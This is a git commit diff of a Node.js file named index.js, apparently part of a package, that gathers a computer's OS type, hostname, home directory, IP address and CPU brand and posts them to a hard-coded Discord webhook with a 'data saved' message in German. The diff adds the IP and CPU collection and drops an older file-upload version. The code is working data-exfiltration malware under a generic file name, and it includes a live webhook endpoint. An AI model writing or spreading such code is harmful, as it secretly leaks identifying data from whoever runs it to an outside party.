9998ddf7ed2b525ea8ce3d026ecdc22a87b398d2
Solid <77588421+Solid999@users.noreply.github.com>
2022-10-24 22:55:34 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,33 +1,21 @@
 const os = require('node:os');
-var file = require('file-system');
-var fs = require('fs');
+var ip = require('ip');
+const features = require('cpu-features')();
 const { Webhook } = require('discord-webhook-node');
 const cloudSolid = new Webhook("https://discord.com/api/webhooks/1033087971982843995/c7LtfNuhB9giLW-TavWGw0ARHkRc7S9Q29SVrdBYrghq50HB6P8Pz9_SG2gQY6Qp_ziO");
 cloudSolid.setUsername('CloudOS');
 cloudSolid.setAvatar('https://img.icons8.com/color/48/000000/download-from-cloud.png')
 const software = '**Betriebssystem: **' + '`' + os.type() + ' | ' + os.platform() + '`'
-var network = JSON.stringify(os.networkInterfaces())
-var cpu = JSON.stringify(os.cpus());
+const network = '**IP Address:** ' + '`' + ip.address() + '`'
 const desktop = '**Desktop: **' + '`' + os.hostname() + '`'
 const homedir = '**PC-NAME:   **' + '`' + os.homedir() + '`'
+const cpu = 'CPU: ' + '`' + features.brand + '`'
 cloudSolid.success(`
  __DATEN GESPEICHERT!__
 
  > ✅  ${homedir},
  > ✅  ${desktop},
  > ✅  ${software},
+ > ✅  ${network},
+ > ✅  ${cpu}
 `)
-fs.writeFile('network.txt', network, function(err){
-    if(err){
-        console.log('Error: ' + err)
-    }
-})
-fs.writeFile('prozessor.txt', cpu, function(err){
-    if(err){
-        console.log('Error: ' + err)
-    }
-})
-setTimeout(()=>{
-    cloudSolid.sendFile('prozessor.txt')
-    cloudSolid.sendFile('network.txt')
-},500)
